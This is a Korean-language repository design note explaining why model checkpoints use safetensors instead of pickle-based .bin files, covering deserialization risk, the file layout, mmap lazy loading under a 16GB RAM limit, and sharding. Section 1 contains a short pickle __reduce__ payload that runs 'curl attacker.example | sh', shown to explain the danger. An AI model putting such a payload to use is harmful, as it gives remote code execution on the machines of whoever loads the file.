# 왜 safetensors 인가

> 작성 2026-09-05. "체크포인트가 왜 `.bin` 이 아니라 `.safetensors` 인가" 를
> 다룬다. 숫자 형식(BF16/FP8)과 서빙 knob 개념은 이미
> [`../08-serving-knobs-concepts.md`](../08-serving-knobs-concepts.md) 1절/7절이 정본이니
> 여기서는 되풀이하지 않는다.

---

## 0. 한 줄 요약

`.bin` 체크포인트는 **pickle** 이고, pickle 을 읽는다는 것은 **파일 안의 코드를
실행한다는 것**과 같다. safetensors 는 코드 실행 경로를 아예 없앤 대신, 그 대가로
"텐서 말고는 아무것도 못 담는다"를 받아들인 포맷이다. 이 저장소가 safetensors 를
쓰는 이유는 보안 하나가 아니라 **mmap 으로 지연 로드가 가능하다는 두 번째 이유가
호스트 RAM 16GB 제약과 직결**되기 때문이다 ([`01-runtime-layout-and-capacity.md`](../01-runtime-layout-and-capacity.md)).

---

## 1. `.bin` 의 정체: pickle

PyTorch 의 전통적인 `torch.save()` / `torch.load()` 는 내부적으로 Python 의
`pickle` 모듈을 쓴다. pickle 은 **임의의 Python 객체**를 바이트로 직렬화하도록
설계됐다 - 텐서든, dict 든, 사용자 정의 클래스 인스턴스든 상관없다.

문제는 그 일반성이 나오는 방식이다. pickle 스트림은 "이 객체를 만들려면 이
함수를 이 인자로 불러라" 를 담을 수 있다 (`REDUCE` opcode, `__reduce__` 프로토콜).
즉 **역직렬화 = 임의 함수 호출**이다. 아래는 실제로 동작하는 악성 페이로드의
축약형이다.

```python
import pickle, os

class Payload:
    def __reduce__(self):
        return (os.system, ("curl attacker.example | sh",))

pickle.dumps(Payload())   # 이 바이트를 "모델 체크포인트"로 위장해서 배포하면 끝
```

`torch.load(path)` 를 부르는 순간 `os.system(...)` 이 실행된다 - 텐서를 하나도
못 봤어도 이미 코드가 돈다. (PyTorch 2.6+ 는 `weights_only=True` 를 기본값으로
바꿔 순수 텐서만 역직렬화하도록 막았지만, 그 이전 버전이나 명시적으로 끈 코드는
여전히 취약하고, Hugging Face Hub 에서 실제로 이런 방식의 악성 체크포인트가
발견된 사례들이 이 우려가 이론이 아님을 보여준다.)

**이 저장소가 오프라인이라 안전하지 않은가?** 아니다. 위험은 "지금 인터넷에
연결돼 있는가"가 아니라 "이 파일이 신뢰 안 되는 경로를 거쳐 왔는가"다. 체크포인트는
외부에서 반입된다 - `flask_api/model_upload/` 가 통째로 "모델 파일을 이 서버로
들여오는" 경로이고, 그 파일의 출처를 업로드 시점에 검증할 방법은 없다. pickle
기반 포맷이면 "반입 후 실행 전"이 아니라 "vLLM 이 로드하는 그 순간"에 이미 코드
실행 여부가 결정된다.

---

## 2. safetensors 의 해법: 파싱에 실행이 없다

safetensors 는 정반대 설계를 택했다 - **표현력을 텐서 하나로 극단적으로 줄이는
대신, 파싱 경로에 코드 실행 가능성을 원천 차단**한다.

```
파일 구조:
┌────────────┬──────────────────────────┬───────────────────────┐
│ 8 bytes    │ N bytes                  │ 나머지                 │
│ (헤더 길이) │ JSON 헤더                │ 텐서 raw bytes (연속)  │
│ little-    │ {"lm_head.weight":       │ 각 텐서는 헤더가 준     │
│ endian u64 │   {"dtype":"BF16",       │ offset 구간을 그대로    │
│            │    "shape":[152064,4096],│ 잘라 읽는다             │
│            │    "data_offsets":[0,N]} │ (memcpy, 역직렬화 없음) │
│            │  , ...}                  │                        │
└────────────┴──────────────────────────┴───────────────────────┘
```

로더가 하는 일은 딱 세 단계다.

1. 앞 8바이트를 정수로 읽어 헤더 길이를 안다.
2. 그 구간을 `json.loads()` 한다 - **JSON 파서에는 애초에 코드 실행 opcode가
   없다.** 최악의 경우 잘못된 dict 가 나올 뿐이다.
3. 헤더가 알려준 `(offset_start, offset_end)` 구간을 텐서 dtype/shape 로
   해석해서 그대로 노출한다.

pickle 의 `REDUCE` 에 대응하는 것이 여기엔 없다. **직렬화가 아니라 메모리
레이아웃을 그대로 디스크에 눕힌 것**에 가깝다 - 그래서 파일이 "저장된 데이터"가
아니라 사실상 "디스크 위의 배열" 이 된다. 이 성질이 바로 다음 절의 mmap 을 가능하게
한다.

---

## 3. 이 저장소와 직결되는 이유: mmap lazy load

`.env` 파일마다 붙는 이 조합을 보자 (`qwen3.8-27b.env`, `mai-ui.env`,
`paddleocr-vl-1.5.env` 전부 동일):

```bash
EXTRA_VLLM_ARGS=... --load-format safetensors --safetensors-load-strategy lazy ...
```

**`lazy` 가 하는 일:** 파일을 읽어서 새 메모리에 복사하는 대신
`mmap()` 으로 프로세스의 가상 주소 공간에 파일을 **매핑**만 한다. 그 시점엔
아무 바이트도 실제로 안 읽힌다. 나중에 forward pass 가 특정 레이어의 가중치에
실제로 접근하면 그제서야 커널이 페이지 폴트를 잡아 디스크(또는 파일 캐시)에서
그 페이지만 읽어 온다.

pickle 기반 `.bin` 로드는 이 흉내를 못 낸다. `pickle.load()` 는 정의상
**새 Python 객체를 만드는 과정**이라 파일 내용을 새 익명 메모리(anonymous
memory)에 통째로 복사해야 텐서 객체가 완성된다. 즉 로드가 끝나기 전에 순간적으로
**체크포인트 전체 크기만큼의 RAM**이 필요하다.

`qwen3.8-27b` 는 BF16 원본 safetensors 합계 51.7GB (`qwen3.8-27b.env` 주석,
약 48GiB) 인데 **호스트 RAM 은 16GB, 스왑 없음**
([`01-runtime-layout-and-capacity.md`](../01-runtime-layout-and-capacity.md)).
pickle 이었다면 로드 자체가 산술적으로 불가능하다. safetensors + mmap 이면
"가상 주소 공간에 48GB 를 매핑" 은 공짜이고, 실제로 물리 메모리에 올라오는 것은
그 순간 forward pass 가 건드린 페이지뿐이다 - GPU 로 넘어가는 가중치는 결국
VRAM 에 상주하므로, 정상 동작 시 호스트 쪽 상주분은 매핑 자체의 페이지테이블
오버헤드 정도로 작다.

### 그래서 `ps` 의 RSS 를 못 믿는다

`deploy_vlms/scripts/check_host_ram.py` 의 첫 줄이 이 얘기다.

> `ps` 의 RSS 는 **못 쓴다**. 가중치를 mmap 으로 읽으므로(safetensors lazy)
> 파일 캐시가 RSS 에 잡혀 실제보다 훨씬 크게 보이고, 그 페이지는 커널이 언제든
> 회수할 수 있다.

mmap 된 파일 페이지는 "이 프로세스가 물고 있는 메모리"처럼 RSS 에 잡히지만
실제로는 **파일 캐시**라 압박이 오면 커널이 그냥 버렸다가 필요할 때 다시 읽으면
그만이다 - 스왑 아웃이 아니라 그냥 드롭이다. 진짜 위험한 것은 되찾을 수 없는
익명 메모리(anon)뿐이다. 그래서 `check_host_ram.py` 는 RSS 대신
`/proc/<pid>/smaps_rollup` 의 `Pss_Anon`(회수 불가) / `Pss_File`(mmap, 회수
가능)을 갈라서 본다. **safetensors 를 안 썼다면 이 구분 자체가 무의미했을
것이다** - `.bin` 로드 결과물은 거의 다 anon 이었을 테니.

### 기본값이 아니라 명시해야 하는 이유

`load-format`/`load-strategy` 를 안 주면 vLLM 이 알아서 고르는데, 그 자동 판단
기준이 "체크포인트 크기가 가용 RAM 의 90% 이하면 eager(=미리 다 복사) 로
prefetch" 다. NFS 마운트에서는 이게 특히 위험하다 - 네트워크 파일시스템은 첫
읽기가 로컬 디스크보다 훨씬 느리므로 vLLM 이 "차라리 한 번에 다 당겨오자"고
판단하기 쉽고, 그 순간 이 절에서 설명한 lazy 의 이점이 통째로 사라진다. 그래서
자동 판단에 맡기지 않고 두 플래그를 **명시**한다.

---

## 4. 왜 파일이 여러 개로 쪼개져 있나

`model-00001-of-00004.safetensors` 처럼 샤딩된 체크포인트를 받는다. 이유는
단순하다 - Hugging Face Hub 는 파일 하나에 5GB 리밋을 두므로 27B 모델(BF16
기준 수십 GB)은 애초에 쪼개서 올라온다. 진실은 `model.safetensors.index.json`
에 있다.

```json
{
  "weight_map": {
    "model.layers.0.self_attn.q_proj.weight": "model-00001-of-00004.safetensors",
    "lm_head.weight": "model-00004-of-00004.safetensors"
  }
}
```

`deploy_vlms/scripts/serve_vlm.py` 의 `estimate_model_weight_bytes()` 가
이 index 를 먼저 찾고, 없으면(`pytorch_model.bin.index.json` 도 없으면)
`*.safetensors` / `*.bin` 을 직접 글롭해서 합산한다 - 즉 이 저장소의 용량 추정
로직 자체가 "safetensors 가 표준이고 `.bin` 은 폴백" 이라는 전제로 짜여 있다.

vLLM 로더 입장에서 샤딩은 mmap 을 여러 번 하는 것뿐이라 lazy 전략과 아무
마찰이 없다 - 파일이 몇 개든 "건드린 페이지만 읽는다" 는 그대로 성립한다.

---

## 5. safetensors 가 못 하는 것

표현력을 텐서로 좁힌 대가가 있다. safetensors 는 **텐서 + 문자열 메타데이터**만
담는다. 옵티마이저 상태(Adam 의 momentum/variance), 학습 스케줄러 상태, 커스텀
Python 객체는 못 넣는다. 그래서 **학습 체크포인트**(재개용, 옵티마이저 포함)는
지금도 `.pt`/`.bin` 으로 저장되는 경우가 흔하고, **추론 배포용 가중치**만
safetensors 로 별도 변환해서 내보내는 것이 관례다. 이 저장소가 받는 것은 항상
후자 - 추론 전용 체크포인트 - 이므로 이 한계가 문제된 적이 없다.

---

## 6. 한 줄 요약

- `.bin` = pickle = **로드가 곧 코드 실행**. 반입 경로(모델 업로드)를 신뢰할
  수 없으면 그 자체로 RCE 표면이다.
- safetensors = 헤더(JSON) + raw bytes. 파싱에 실행 가능한 opcode가 없다.
- 이 저장소에서 진짜 결정적인 이유는 보안보다 **mmap lazy load** - 48GB
  체크포인트를 16GB/스왑 없음 호스트에서 돌릴 수 있는 것은 이 성질 덕분이다.
- `ps` RSS 가 못 믿을 숫자가 되는 것도, index.json 으로 샤드를 찾는 로직도,
  전부 이 포맷 선택 하나에서 파생된다.

---

## 더 볼 것

- [`../08-serving-knobs-concepts.md`](../08-serving-knobs-concepts.md) 1절 - BF16/FP8 등
  **숫자 형식**(safetensors 가 담는 dtype 그 자체) 개념, 7절 - 호스트 RAM 제약과
  다른 knob 들
- [`../01-runtime-layout-and-capacity.md`](../01-runtime-layout-and-capacity.md) - 16GB
  호스트 RAM 제약의 전체 맥락
- `deploy_vlms/scripts/check_host_ram.py` - Pss_Anon/Pss_File 을 실제로 재는 코드
- `deploy_vlms/scripts/serve_vlm.py` `estimate_model_weight_bytes()` - index.json
  기반 용량 추정
